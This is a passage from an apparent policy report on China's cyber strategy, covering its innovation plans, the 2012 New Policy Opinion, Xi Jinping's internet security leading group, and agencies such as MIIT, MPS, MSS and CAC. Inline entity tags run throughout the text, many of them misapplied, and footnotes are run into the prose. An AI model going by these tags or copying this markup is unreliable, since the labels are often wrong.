talking about technology or cyberspace . In order to achieve that goal , instead of merely accepting the current standards , the government wants to become a lead shaper , or at least a co - shaper , of international standards through innovation.48 Accordingly , the document lists [GPE] China \u2019s goals for technological indigenous innovation and recognises the need for increased investment in research and development . Other research49 suggests that the plan reflects [GPE] China \u2019s resolve to overcome domestic , social and environmental issues through technological innovation , while continuing with the firm understanding that only the government can drive such innovation , guiding enterprises and the business sector which will execute the strategies . Perhaps the most important aspect for the international community is [GPE] Beijing \u2019s strong determination to loosen ties with foreign innovation firms and set the foundation for a truly independent base of knowledge . Concerns over the possibly of an emergent \u2018 techno - nationalism \u2019 seem therefore justified . The plan calls for [GPE] China not to obtain any \u2018 core technologies in key fields that affect the lifeblood of the national economy and national security \u2019 from abroad , including next - generation internet technologies , digitally controlled machine tools , and high - resolution earth observation systems.50In order to deliver this , the government has increased R&D expenditure which will rise to 2.5 % of GDP by [DATE] 2020 . While it is believed that [GPE] China will have overtaken the [GPE] US by [CARDINAL] 2020,51 estimated figures for [GPE] China in [DATE] 2016 remain [PERCENT] around [PERCENT] 2 % , or $ 396.3 [MONEY] billion , while those of the [GPE] US are 2.77 % and $ 514 [MONEY] billion , still maintaining a significant gap between the two.52 Even though [GPE] China \u2019s figures show an [CARDINAL] almost [CARDINAL] two [CARDINAL] - fold increase from $ [MONEY] 213.4 in [DATE] 201053 , they need to be taken with a degree of scepticism , as large part of the budget is spent on developing infrastructure , rather than on scientific research . Nevertheless , [NORP] Chinese researchers and enterprises do have increasingly more incentives and support to develop intellectual property , fulfilling the government \u2019s wish to reduce dependence on foreign technologies . Despite good intentions , such policies may actually amplify industrial espionage , as many local businesses lack the required skills and thus acquire the needed technology from abroad and simply modify it as necessary , often illegally.54 Here , one can find another controversy : a part of the [NORP] Chinese understanding of \u2018 indigenous \u2019 highlights producing original innovations such as new products and services.55 This [PERSON] seemingly47 [PERSON] Li , [DATE] 2012 , p. [CARDINAL] 6 . [CARDINAL] 48 Ernst , [DATE] 2010 , p. [CARDINAL] 96 . [ORG] 49 [ORG] Swedish [ORG] Institute [ORG] for [ORG] Growth [ORG] Policy [ORG] Studies has conducted [CARDINAL] one of the most comprehensive studies on the [DATE] 15 [DATE] - [DATE] year plan and its implications . See more at [GPE] Serger , [PERSON] Sylvia [PERSON] Schwaag , and Magnus Breidne . \u2018 [GPE] China \u2019s Fifteen [DATE] - Year Plan for Science and Technology : An Assessment . \u2019 Asia Policy 4 ( [DATE] 2007 ): [DATE] 135 [DATE] - [DATE] 64 . < url technology-an-assessment.html > . [CARDINAL] 50 [ORG] Ernst , [DATE] 2010 , p. [CARDINAL] 24 . [CARDINAL] 51 \u2018 [ORG] China [ORG] Headed [ORG] to [GPE] Overtake [GPE] EU , [GPE] US in [ORG] Science [ORG] & [ORG] Technology [ORG] Spending , [ORG] OECD [ORG] Says . \u2019 [ORG] OECD . [DATE] 12 [DATE] Nov. [DATE] 2014 . Accessed [DATE] 22 [DATE] Aug. [DATE] 2016 . < url 52 2016 Global R&D Funding Forecast . Report by [ORG] Industrial [ORG] Research [ORG] Institute , [DATE] 2016 . < url 53 \u2018 Gross Domestic Spending on R&D. \u2019 OECD Data . [DATE] 2016 . Accessed [DATE] 22 [DATE] Aug. [DATE] 2016 . < url spending-on-r-d.htm > . [DATE] 54 Suttmeier , [PERSON] Richard [PERSON] P. , \u2018 Information Security and [ORG] the [ORG] Dynamics [ORG] of [ORG] Innovation , \u2019 p. [CARDINAL] 12 in [GPE] Lindsay , [DATE] 2012 . [ORG] 55 [ORG] Ernst , [DATE] 2010 , p. 25.12contradicts the purpose of [NORP] Chinese cyber espionage , which allows the perpetrators to remain far from originality and rely instead on already established models . The [DATE] 15 [DATE] - [DATE] year strategy does not address any particularly military related goals or concerns . Its further aim is to prioritise energy , water supply and environmental technologies together , and to recognise that a better position on intellectual property rights would also strengthen [GPE] China \u2019s general competitiveness in the world markets.56 However , [PERSON] Timothy [PERSON] Thomas has brought out the plan \u2019s aspects that could in some ways be associated with enhancing [GPE] China \u2019s capabilities in the offensive side , considering the strategy a counterpart to [ORG] the [ORG] American [ORG] National [ORG] Military [ORG] Strategy for Cyberspace Operations.57 [CARDINAL] One interpretation of the strategy \u2019s goal would therefore be the desire to secure the home front before assaulting other countries . Indeed , given the intertwined nature of digital world , civilian cyberspace is certainly the most vulnerable target and would suffer the most harm if successfully attacked . By contrast , [ORG] Dieter [ORG] Ernst believes that the crux of this plan remains how to execute the key objective of indigenous innovation while becoming more and more integrated into global corporate production networks , often led by Western ideals.58While the [DATE] 15 [DATE] - [DATE] year strategy has initiated the improvement of [GPE] China \u2019s innovation system , its success depends on reinforcing open markets and international linkages between [GPE] China \u2019s technology and global standards , while executing its domestic innovation and thus creating a \u2018 two - track \u2019 approach.59 Indeed , [GPE] China \u2019s technology giants such as [ORG] Huawei and [ORG] Xiaomi are gradually entering the world markets , but the opposite direction allowing foreign technology firms to trade in [GPE] China is still restricted . For example , the extensive \u2018 Multi - Level Protection Scheme \u2019 introduced in [DATE] 2007 intended to protect national security through prohibiting foreign companies from selling any core products to the government , banking , transportation , and other critical infrastructure companies , and the [DATE] 2010 \u2018 Compulsory Certification for Information Security Scheme \u2019 required that foreign companies wishing to sell to the [NORP] Chinese government must give their products \u2019 intellectual property rights to the government . A continuation to that trend in [DATE] February [DATE] 2015 saw the beginning of a \u2018 cyber security new regime \u2019 which assumes that all foreign technology firms supplying [NORP] Chinese banks might be required to share their source code and even include back doors into hardware and software.60 The attention that everything related to cyberspace and information technology is continuously receiving shows that the [NORP] Chinese have not given up their ambitions . In [DATE] July [DATE] 2012 , [ORG] the [ORG] State [ORG] Council \u2019s [ORG] Information [ORG] Office ( SCIO ) issued [ORG] a [ORG] New [ORG] Policy [ORG] Opinion ( [ORG] NPO ) , translated as \u2018 [ORG] The [ORG] State [ORG] Council vigorously promotes informatisation development and offers several opinions on conscientiously protecting information security\u2019.61 Even though released [DATE] nearly [DATE] a [DATE] decade after Document [CARDINAL] 27 and [CARDINAL] more [CARDINAL] than [CARDINAL] half a decade after the [DATE] 15 [DATE] - [DATE] year strategy , its overall concerns remain the same , showing that not all goals have been met . It persistently notes [GPE] China \u2019s exposure to urgent challenges in international competition over the control , use and acquisition of information . More precisely , the disparity between the [LOC] West and [GPE] China in digital infrastructure , inefficient exchange of information between government and industry , poor cyber security planning , inadequate defence capabilities , and a continuously large share of control over core technologies by foreigners attract the most attention . [CARDINAL] 62 Unlike previous documents , the [ORG] NPO connects developments in information security to people \u2019s economic and social56 Serger and Breidne , [DATE] 2007 , p. [CARDINAL] 145 . [CARDINAL] 57 [PERSON] Thomas , [PERSON] Timothy [PERSON] L. [PERSON] \u2018 [PERSON] Chapter [CARDINAL] 20 : Nation [ORG] - [ORG] State [ORG] Cyber [ORG] Strategies : Examples from [GPE] China and [GPE] Russia , \u2019 in [GPE] Kramer , [PERSON] Franklin [PERSON] D. , [PERSON] Stuart [PERSON] H. [PERSON] Starr , and [PERSON] Larry [PERSON] K. [PERSON] Wentz ( eds ) Cyberpower and [ORG] National [ORG] Security , [ORG] National [ORG] Defense [ORG] University [ORG] Press and [ORG] Potomac [ORG] Books [ORG] Inc. , [DATE] 2009 . Accessed via < url 58 Ernst , [DATE] 2010 , p. [CARDINAL] 1 . 59 Ibid . , p. [CARDINAL] 26 . [TIME] 60 Segal , [TIME] Adam . \u2018 What to Do About [GPE] China \u2019s [EVENT] New [EVENT] Cybersecurity [EVENT] Regulations ? \u2019 Council on Foreign Relations . [DATE] 2 [DATE] Feb. [DATE] 2015 . Accessed [DATE] 22 [DATE] Aug. [DATE] 2016 . < url [CARDINAL] 61 The full text of the [ORG] NPO in [NORP] Chinese is available at < url 62 Segal , [PERSON] Adam . \u2018 China Moves Forward on Cybersecurity Policy . \u2019 Council on Foreign Relations . [DATE] 24 [DATE] July [DATE] 2012 . Accessed [DATE] 22 [DATE] Aug. [DATE] 2016 . < url This shows an expansion from \u2018 safeguarding national security information \u2019 to \u2018 promoting stable and rapid economic development and social harmony and stability \u2019 . [CARDINAL] 63Giles and [ORG] Hagestad have distilled the [ORG] NPO \u2019s [CARDINAL] four policy mandates , which like the previously analysed documents focus on civil cyber defence:\uf0b7\uf0b7\uf0b7\uf0b7Firstly , the [ORG] NPO places strong emphasis on the security of all critical information systems and infrastructure , especially focusing on information networks . This can be interpreted as an order , rather than guidance , on what the policymakers must protect \u2013 the internet , radio networks and private telecommunications systems , as well as information networks related to finance , energy and transportation . Its clear goal is to secure those industries where a cyber attack would cause tremendous harm to [GPE] China \u2019s economy.64Secondly , the [ORG] NPO seeks to strengthen the governmental and classified information security systems , which are often attractive targets for hacktivists like [PERSON] Anonymous . For execution , [ORG] the [ORG] State [ORG] Council expects the government agencies to reduce their internet connectedness and enhance information security and confidentiality protection monitoring by establishing a hierarchical system to protect classified information systems.65Thirdly , the [ORG] NPO seeks to increase protection of industrial control systems of facilities such as oil and gas pipelines , nuclear and power infrastructures , as well as transportation and urban facilities , all invoking the memory of Stuxnet . This should be achieved through strengthening regulations and conducting more frequent security checks and risk assessments.66Finally , the [ORG] NPO turns to safeguarding [NORP] Chinese citizens \u2019 personal information , noting its significance in achieving the general welfare of the country and thus promising protection of demographic , geographical or similarly sensitive data.67 This step can be considered a countermove to an attack in [DATE] 2012 which compromised [CARDINAL] millions of users \u2019 data on an opinion forum , [GPE] Tianya , and a retail site , 360buy.com.68The [ORG] NPO is certainly a very comprehensive document , which covers the majority of essential areas of cyber security . [ORG] The [ORG] State [ORG] Council \u2019s recommendations indicate the main weaknesses of [GPE] China \u2019s information security model , and point out the increased vulnerabilities from growing dependence on the internet . Continuing hostility towards foreign technologies also suggests that related trade barriers will not be abolished in the near future . However , as an intriguing point in light of President Xi \u2019s anti - corruption campaign , the [ORG] NPO does not seem to address corruption , which is widespread within the technology industry . As the crackdown has not proven fully successful , the government could think of rewarding legitimate officials and entrepreneurs to prevent dishonest players from compromising the industry \u2019s development . Overall , the [ORG] NPO indicates that information security had , by [DATE] 2012 , already become one of the government \u2019s priorities . The analysis of these documents indicates that [GPE] China \u2019s main information security concerns have remained rather similar throughout [DATE] the [DATE] years . Guided by these principles , [DATE] 2014 was finally considered [DATE] a [DATE] year of breakthrough towards a better regulated cyberspace . The establishment of [ORG] the [ORG] Central [ORG] Leading [ORG] Small [ORG] Group [ORG] for [ORG] Internet [ORG] Security [ORG] and [ORG] Informatisation on [DATE] 27 [DATE] February [DATE] 2014 shows President [PERSON] Xi \u2019s personal commitment , as he is the [ORDINAL] first party head to [PERSON] chair63 [PERSON] Xue [PERSON] Ruihan , \u2018 [PERSON] Jianli jianqian guojia wangluo he xinxi anquan chang xiao jizhi ( [NORP] Establish and improve the national network and information security long - term mechanisms ) , \u2019 [PERSON] Renmin [PERSON] Wang ( People \u2019s [ORG] Daily [ORG] Online ) , [CARDINAL] 17 Apr. [DATE] 2014 , < url [CARDINAL] 24909496.html > , cited in [GPE] Chang , [DATE] 2014 , p. [CARDINAL] 17 . [CARDINAL] 64 [PERSON] Gu , Fa , \u2018 [ORG] State [ORG] Council vigorously promotes the development of information technology and to effectively protect the information security . \u2019 2012 , cited in [GPE] Giles and [GPE] Hagestad , [DATE] 2013 , p. [CARDINAL] 12 . [CARDINAL] 65 [PERSON] Ibid , p. [CARDINAL] 13 . [CARDINAL] 68 [PERSON] Zhu , [PERSON] Yishi . \u2018 Hackers Find Holes Behind [ORG] the [ORG] Great [ORG] Firewall . \u2019 Hackers Find Holes Behind [ORG] the [ORG] Great [ORG] Firewall . [DATE] 21 [DATE] Jan. [DATE] 2012 . Accessed [DATE] 22 [DATE] Aug. [DATE] 2016 . < url leading small group related to information management.69 When explaining the necessity of the new body , [PERSON] Xi has pointed out [GPE] China \u2019s need to catch up with the [LOC] West in innovation , and further developed his argument that \u2018 no internet safety means no national security and no informatisation means no modernization\u2019.70 The leading group gives unprecedented priority to both internet security and information management as a single concept , trying to fight the lack of a coordinated approach that has caused problems in the past . President [PERSON] Xi has referred to internet security and information management as \u2018 [CARDINAL] two wings of [CARDINAL] one bird , [CARDINAL] two wheels on [CARDINAL] one car\u2019.71 With [PERSON] Xi as its head , the new group should be able to make firm demands and solve internal discrepancies where necessary . As part of the new initiative , [DATE] November [DATE] 2014 saw the first World Internet Conference , hosted in [GPE] Wuzhen , [GPE] China . With the presence of representatives from various big names like [ORG] Apple and [ORG] Microsoft , President [PERSON] Xi affirmed that under the terms of mutual respect and trust , [GPE] China was willing to cooperate with other states to achieve a peaceful cyberspace and a multilaterally governed , transparent internet , while sticking to the notion that state sovereignty must be fully respected in cyberspace.72 At the [ORDINAL] second Conference [DATE] a [DATE] year [DATE] later , President [PERSON] Xi delivered a keynote speech in which he called for \u2018 building a cyber community of common destiny and put forward the principles of respecting cyber sovereignty , safeguarding cyber security , encouraging cyber opening up , and building cyber order\u2019.73 As part of his ideas , [PERSON] Xi proposed building an internet governance system based on a multilateral approach , and denounced unilateralism in which only a few parties discuss the future of the internet.74 His other proposals concerned the digital gap , cultural diversity in cyberspace , the digital economy , and cyber security in general , indicating the core elements of [GPE] China \u2019s cyber strategy . While this call might be a chance for deeper cooperation with [GPE] China , it also impliedly depicts [GPE] China \u2019s dissatisfaction with the current system and the desire to guide the existing structure and governance of cyberspace and technological development closer to their way of thinking.75 Indeed , in [ORG] the [ORG] National [ORG] Meeting [ORG] on [ORG] Cyber [ORG] Security [ORG] and [ORG] Information [ORG] Technology held in [DATE] April [DATE] 2016 , President [PERSON] Xi once again reaffirmed the importance of cyber sovereignty , implying a rejection of the applicability of international law and existing regulations in cyberspace.76Overall , despite the lack of [CARDINAL] one single strategy clearly listing [GPE] China \u2019s future plans and ambitions , the different pieces of information allow a number of conclusions . The existing and newly created mechanisms must improve the security of the domestic internet infrastructure , reinforce the move towards indigenous innovation detailed in the [DATE] 15 [DATE] - [DATE] year plan , and , most importantly , help [GPE] China become the leading actor on the global stage by promoting an alternative attitude to internet governance . The [NORP] Chinese government understands the value and power of technology , innovation , and the internet , but remains extremely careful in operating the \u2018 double - edged sword \u2019 , being aware that free information , once released , is impossible to stop and has great potential to shake the foundation of the communist party and the political order of [GPE] China . [DATE] Last [DATE] year , for example , the government set up a doctrine of [CARDINAL] Seven Baselines for using the internet , requiring that whatever is expressed online , must respect [CARDINAL] seven elements : laws and regulations , the socialist system , the country \u2019s national interest , citizens \u2019 lawful rights and69 [PERSON] Rountree , Florence . \u2018 Information management and internet regulation in [GPE] China . \u2019 [GPE] China 's Expanding Cyberspace ( [DATE] 2014 ): pp . [DATE] 11 [DATE] - [DATE] 13 . < url 70 [PERSON] Zhu , [GPE] Ningzhu . \u2018 Xi Jinping Leads Internet Security Group . \u2019 Xinhuanet . [DATE] 27 [DATE] Feb. [DATE] 2014 . Accessed [DATE] 22 [DATE] Aug. [DATE] 2016 . < url 71 \u2018 Xi Jinping : Ba wo guo cong wangluo daguo jianshe chengwei wangluo qiangguo ( Xi Jinping : From a big internet country to a powerful internet country ) . \u2019 Xinhuanet . 28 [DATE] Feb. [DATE] 2014 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url 02/28 / c_133148804.htm > . [CARDINAL] 72 \u2018 [NORP] Chinese President [PERSON] Xi [PERSON] Jinping Calls for International Cooperation on Cyberspace Security . \u2019 The Economic Times . [DATE] 19 [DATE] Nov. [DATE] 2014 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url calls - for - international - cooperation - on - cyberspace - security / articleshow/45205445.cms > . [CARDINAL] 73 \u2018 Infographic : Achievements of the 2nd WIC . \u2019 China Daily . [CARDINAL] 21 [DATE] Dec. [DATE] 2015 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url 74 Zhang , [PERSON] Rui . \u2018 China Headlines : [PERSON] Xi [PERSON] Slams [PERSON] ' double Standards , ' Advocates Shared Future in [PERSON] Cyberspace . \u2019 CCTV.COM . [CARDINAL] 17 [DATE] Dec. [DATE] 2015 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url [DATE] 75 Lu , Chuanying . \u2018 [GPE] China 's Emerging Cyberspace Strategy . \u2019 The Diplomat . [DATE] 24 [DATE] May [DATE] 2016 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url [DATE] 76 [PERSON] Lu , 2016.15interests , public order , morality , and accuracy.77 Given this , it is likely that the government will continue with a similar supervisory mind - set . Institutional fragmentation has been a constant feature in [GPE] China \u2019s cyber organisation . A mixture of government institutions and military departments , together with uncoordinated action between central and local authorities , has created a strong incentive for establishing a more streamlined and synchronised approach . To give a clear overview of the exact institutions in play , this chapter will introduce the past and recently launched initiatives that shape [GPE] China \u2019s cyber governance , including [ORG] Xi [ORG] Jinping \u2019s [ORG] Central [ORG] Leading [ORG] Small [ORG] Group [ORG] for [ORG] Internet [ORG] Security [ORG] and [ORG] Informatisation . The chapter will examine both civilian and military organs , and will first cover how the general responsibility of cyber security is organised and coordinated by looking at the bodies responsible for the decisions and execution . The military part of the chapter [ORDINAL] first introduces the military \u2019s strategic thought and then focuses on the role of [ORG] the People \u2019s [ORG] Liberation [ORG] Army and its cyber espionage and intelligence units , which have previously acted mainly under the [ORDINAL] 3rd and 4th Departments of [ORG] the [ORG] General [ORG] Staff [ORG] Department , but are expected to see a restructuring under the newly created [PRODUCT] Strategic [PRODUCT] Support [PRODUCT] Force . This section also includes an analysis of the patriotic hacktivist groups which , despite their usefulness to the government , may seriously hamper [GPE] China \u2019s overall development and foreign relations . As [PERSON] Amy [PERSON] Chang has noted , the key driver for formulating [GPE] China \u2019s cyber security strategy remains maintaining the communist party \u2019s ruling power.78 Therefore , as with any other subject , the party ultimately commands all the mechanisms regulating [GPE] China \u2019s cyberspace . So far , it has not been able to effectively reduce the large number of stakeholders with competing interests . However , like the noticeable trend in several other countries like [GPE] Israel and the [GPE] US , [GPE] China \u2019s recent steps have allowed it to move towards a more streamlined unified command line for cyber . The highest - level decision - makers in [GPE] China are [ORG] the [ORG] Politburo [ORG] Standing [ORG] Committee , [ORG] the [ORG] State [ORG] Council , and [ORG] the [ORG] Central [ORG] Military [ORG] Commission . For policy - making , it is [ORG] the [ORG] State [ORG] Council that usually adopts new initiatives , including those in cyberspace , such as the [DATE] 15 [DATE] - Year Plan in [DATE] 2006 and [ORG] the [ORG] New [ORG] Policy [ORG] Opinion in [DATE] 2012 , but there are several government agencies charged with the execution of policy . In [DATE] 1982 , when [GPE] China was not even connected to the internet , [ORG] the [ORG] State [ORG] Council set up a government body for digital affairs , seeking to centralise control over the developing \u2018 computers and large - scale integrated circuits\u2019.79 [ORG] Groups with similar structures and roles remain the key organisations [DATE] today , but before turning to explaining their current functions , ministerial - level agencies which mostly perform general policy implementation will be introduced:\uf0b7The [ORG] Ministry [ORG] of [ORG] Industry [ORG] and [ORG] Information [ORG] Technology ( [ORG] MIIT ) was established in [DATE] 2008 as an attempt to centralise information technology development . It undertakes all [ORG] State [ORG] Council work on information management and carries similar domestic responsibilities to [ORG] the [ORG] Department [ORG] of [ORG] Homeland [ORG] Security in the [GPE] US . It also sets standards , holds exercises , inspects network security , and coordinates information and telecoms security through a special department.80 Whereas the primary duty to respond to cyber - attacks rests with [ORG] the [ORG] National [ORG] Computer [ORG] Network [ORG] Emergency [ORG] Response [ORG] Technical Team / [ORG] Coordination [ORG] Centre [ORG] of [ORG] China ( [ORG] CNCERT ) \u2013 a non - governmental technical centre established in [DATE] 2002 , [ORG] MIIT has been influential in77 [ORG] Creemers , [DATE] 2015 , p. [CARDINAL] 10 . 78 [PERSON] Chang , [DATE] 2014 , p. [CARDINAL] 32 . [CARDINAL] 79 [ORG] Wang , [DATE] 2014 , cited in [GPE] Rountree , [DATE] 2014 , [GPE] p.11 . [CARDINAL] 80 The Cyber Index : International Security Trends and Realities . Report by [ORG] the [ORG] United [ORG] Nations [ORG] Institute [ORG] for [ORG] Disarmament [ORG] Research , [DATE] 2013 , p. [CARDINAL] 15 . < url its work through helping it build virus and vulnerability databases , finding malicious [ORG] IP and domain name providers , and guiding [ORG] CNCERT to engage in international cooperation.81 [ORG] MIIT also contains [ORG] the [ORG] State [ORG] Administration [ORG] for [ORG] Science , [ORG] Technology [ORG] and [ORG] Industry [ORG] for [ORG] National [ORG] Defence ( SASTIND ) , which drafts guidelines , policies , laws and regulations involved with science , technology and industry for national defence.82 Prior to [ORG] MIIT a separate ministry , [ORG] the [ORG] Commission [ORG] for [ORG] Science , [ORG] Technology [ORG] and [ORG] Industry [ORG] for [ORG] National [ORG] Defence ( COSTIND ) , carried out similar tasks . [ORG] The [ORG] Ministry [ORG] of [ORG] Public [ORG] Security ( [ORG] MPS ) investigates cybercrime and takes care of critical infrastructure protection together with development work through a wide network of research labs.83 It is also responsible for overseeing the commercial products used by the government and controlling all commercial information security companies . Importantly , [ORG] MPS operates [ORG] the [ORG] Great [ORG] Firewall [ORG] of [ORG] China and is also involved with conducting domestic intelligence.84The [ORG] Ministry [ORG] of [ORG] State [ORG] Security ( [ORG] MSS ) functions as an organ to conduct counterespionage , counterintelligence , foreign intelligence , and domestic intelligence . Its efforts originally focused on countering separatism , terrorism and religious extremism , which are often described as the [CARDINAL] three existential challenges to [ORG] the [ORG] Communist [ORG] Party . However , despite having attracted little public attention , [ORG] MSS \u2019s estimated cyber capabilities have grown significantly in order to collect further political and economic data on foreign governments , NGOs and domestic dissidents.85\uf0b7\uf0b7Other than these institutions , various sources have also highlighted the importance of [ORG] the [ORG] State [ORG] Encryption [ORG] Bureau , which conducts party , civilian and military encryption management , including restricting the import and export of any encrypted devices ; and [ORG] the [ORG] State [ORG] Secrets [ORG] Bureau , which manages all classified networks and has been increasingly engaged in keeping up with the technological changes [GPE] China is witnessing.86 As all of the [CARDINAL] three ministries and the [CARDINAL] two bureaus operate under [ORG] the [ORG] State [ORG] Council , they are seemingly equal in hierarchy . However , looking at past actions and attention , [ORG] the [ORG] Ministry [ORG] of [ORG] Industry [ORG] and [ORG] Information [ORG] Technology seems to be the main force behind executing the tangible progress of [GPE] China \u2019s cyberspace . On the research and development side , further attention has been paid to a number of government affiliated research institutions , such as [ORG] the [ORG] Chinese [ORG] Institute [ORG] of [ORG] Contemporary [ORG] International [ORG] Relations , which acts directly under [ORG] MSS , [ORG] the [ORG] Chinese [ORG] Academy [ORG] of [ORG] Engineering , and [ORG] the [ORG] Chinese [ORG] Academy [ORG] of [ORG] Sciences . Not surprisingly , [ORG] Tsinghua [ORG] University [ORG] and [ORG] Peking [ORG] University , the top [CARDINAL] two academic institutions in [GPE] China , are closely related to the government \u2019s information technology related research work . Deeper strategic development is run by the [ORG] PLA through institutions such as [ORG] the [ORG] Academy [ORG] of [ORG] Military [ORG] Science and [ORG] the [ORG] PLA [ORG] Information [ORG] Engineering [ORG] University . [DATE] March [DATE] 2016 saw the launch of [ORG] the [ORG] Cyber [ORG] Security [ORG] Association [ORG] of [ORG] China , consisting of academic institutes , individuals and internet companies such as [ORG] Tencent , to speed up the development of industry standards and better coordinate research on cyber security.8781 Fu , [PERSON] Jingguang . \u2018 Policies and Practices on Network Security of MIIT . \u2019 Workshop on Cybersecurity Policy Development in the APEC Region . [GPE] Hangzhou . [CARDINAL] 27 Mar. [DATE] 2011 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url WKSP/11_tel43_spsg_wksp_004.pdf > . To learn more about [GPE] China \u2019s national [ORG] CERT , see their website < url [CARDINAL] 82 \u2018 [ORG] State [ORG] Administration [ORG] for [ORG] Science , [ORG] Technology [ORG] and [ORG] Industry [ORG] for [ORG] National [ORG] Defense ( SASTIND ) . \u2019 Nuclear Threat Initiative . [DATE] 1 [DATE] Oct. [DATE] 2011 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url [CARDINAL] 83 Goodrich , [GPE] Jimmy , \u2018 [NORP] Chinese Civilian Cybersecurity : Stakeholders , [ORG] Strategies , and Policy , \u2019 p. [CARDINAL] 6 in [GPE] Lindsay , [DATE] 2012 . [CARDINAL] 84 [PERSON] Feakin , Tobias . Enter the Cyber Dragon . Report by [ORG] the [ORG] Australian [ORG] Strategic [ORG] Policy [ORG] Institute , [DATE] 2013 , p. [CARDINAL] 3 . < url cyber - capabilities/10_42_31_AM_SR50_chinese_cyber.pdf > . [CARDINAL] 85 Inkster , [GPE] Nigel . [GPE] China 's [ORG] Cyber [ORG] Power . Routledge , [DATE] 2016 , p. [CARDINAL] 54 . [CARDINAL] 86 Goodrich , [DATE] 2012 , p. [CARDINAL] 6 . [CARDINAL] 87 \u2018 [GPE] China [ORG] Launches [ORG] First [ORG] Cybersecurity [ORG] Organisation . \u2019 Cyber Security Review . [CARDINAL] 26 Mar. [DATE] 2016 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url leading groups and Leading small groups have become a common feature in [GPE] China \u2019s political culture to tackle issues that the existing bureaucratic machine is incapable of solving . Complying directly with the orders of the party \u2019s highest leaders , these are perhaps the most efficient mechanisms to the adoption of successful reforms . Whereas [ORG] the [ORG] State [ORG] Informatisation [ORG] Leading [ORG] Group ( SILG ) and [ORG] the [ORG] State [ORG] Network [ORG] and [ORG] Information [ORG] Security [ORG] Coordination [ORG] Small [ORG] Group ( SNISCSG ) \u2013 the [ORDINAL] first efforts to develop [GPE] China \u2019s indigenous information technologies and formulate a secure [NORP] Chinese cyberspace \u2013 were guided by [ORG] the [ORG] State [ORG] Council , the recently established [ORG] Central [ORG] Leading [ORG] Small [ORG] Group [ORG] for [ORG] Internet [ORG] Security [ORG] and [ORG] Informatisation ( [ORG] CLSGISI ) acts directly under the direction of President [PERSON] Xi , and has thereby assumed unprecedented authority . The leading group reportedly consists of [CARDINAL] 22 members : next to [PERSON] Xi [PERSON] Jinping , the Premier [PERSON] Li [PERSON] Keqiang and a [ORG] Standing [ORG] Committee member [PERSON] Liu [PERSON] Yunshan act as vice - chairs , to lead [CARDINAL] eight other [ORG] Politburo members and [CARDINAL] eleven ministerial - level officials . As it is common in [GPE] China for a new body to take over the duties of a previously existing organ , this group has subsumed the roles of the SILG and [ORG] SNISCSG , by merging most of the members from the previous [CARDINAL] two bodies.88 Next to the obvious significance of the group deriving from its high leadership which shows cyber security \u2019s weight in [NORP] Chinese policy - making , the group is hoped to act as a middleman resolving internal misunderstandings between the ministerial - level institutions described above . [DATE] More [DATE] than [DATE] two [DATE] years after its establishment , the [ORG] CLSGISI itself has not been much discussed in the [LANGUAGE] English - speaking media , but the executive body implementing President [PERSON] Xi \u2019s reforms \u2013 [ORG] the [ORG] Cyberspace [ORG] Administration [ORG] of [ORG] China ( CAC ) \u2013 has caught its attention rather often . The [ORG] CAC is basically a refreshment of [ORG] the [ORG] State [ORG] Internet [ORG] Information [ORG] Office ( [PERSON] SIIO ) as its [NORP] Chinese name and chairman [PERSON] Lu [PERSON] Wei remained the same , although [PERSON] Lu unexpectedly stepped down in [DATE] June [DATE] 2016 to be replaced by [PERSON] Xu [PERSON] Lin . [PERSON] SIIO was founded in [DATE] 2011 to better coordinate the \u2018 rectification \u2019 of the internet , working in close cooperation with [ORG] MIIT and [ORG] MPS to patrol social media , where user - created content generates a serious nuisance to the government . Establishing [PERSON] SIIO was a specific step by [ORG] the [ORG] State [ORG] Council [ORG] Information [ORG] Office ( SCIO ) , which manages the general domestic information flow.89 Seemingly tied with [PERSON] Xi \u2019s power consolidation and countering domestic disobedience , CAC \u2019s predominant function remains the same as that of [PERSON] SIIO \u2013 to monitor information movement and further strengthen the grip on websites allegedly undermining domestic stability . The creation of [ORG] CAC also represents an attempt to combine propaganda with technological innovation and development.90 For example , [ORG] CAC has published a choral anthem , which includes verses such as \u2018 with loyalty and devotion , we watch over our domain day and night . \u201991 Affirming the significance of the future of [GPE] China \u2019s cyberspace , [ORG] Time [ORG] Magazine included [PERSON] Lu [PERSON] Wei among the [CARDINAL] 100 most influential people in [DATE] 2015 , emphasising his ( former ) power to pilot [CARDINAL] more [CARDINAL] than [CARDINAL] 700 [CARDINAL] million [NORP] Chinese [ORG] netizens.92 CAC has so far executed its power by blocking foreign VPNs , closing and monitoring [ORG] WeChat ( the most popular messaging application in [GPE] China ) accounts of individuals perceived as threatening , and possibly coordinating cyber - attacks against anti - censorship groups such as GreatFire.org , an organisation seeking to bring transparency to [ORG] the [ORG] Great [ORG] Firewall by providing information on any blocked websites and keywords.93 [DATE] The [DATE] beginning [DATE] of [DATE] 2016 saw a proposal for a new cyber security law that would include provisions theoretically banning local service providers from enabling connections to sites with domain names [PERSON] registered88 [PERSON] Creemers , [ORG] Rogier . \u2018 Cybersecurity and [ORG] Informatization [ORG] Leading [ORG] Group : Names and Documents . \u2019 China Copyright and Media . [CARDINAL] 13 Mar. [DATE] 2014 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url informatization - leading - group - names - and - documents/ > . [CARDINAL] 89 Rountree , [DATE] 2014 , p. [CARDINAL] 12 . [CARDINAL] 90 Creemers , [DATE] 2015 . [DATE] 91 Sisi , [PERSON] Wei , and [PERSON] Qiu [PERSON] Wei . \u2018 [GPE] China \u2019s Internet Censors Have a Choral Anthem and It 's Everything You Want It to Be . \u2019 [ORG] Quartz . [DATE] 16 [DATE] Feb. [DATE] 2015 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url want - it - to - be/ > . 92 Huntsman , Jon . \u2018 The [CARDINAL] 100 Most Influential People : [PERSON] Lu [PERSON] Wei . \u2019 Time . 16 Apr. [DATE] 2015 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url [CARDINAL] 93 The team at GreatFire.org wrote an open letter to [PERSON] Lu [PERSON] Wei in [DATE] January [DATE] 2015 , drawing on evidence from a variety of sources and showing CAC \u2019s involvement in man - in - the - middle attacks against foreign technology giants such as [ORG] Apple , [ORG] 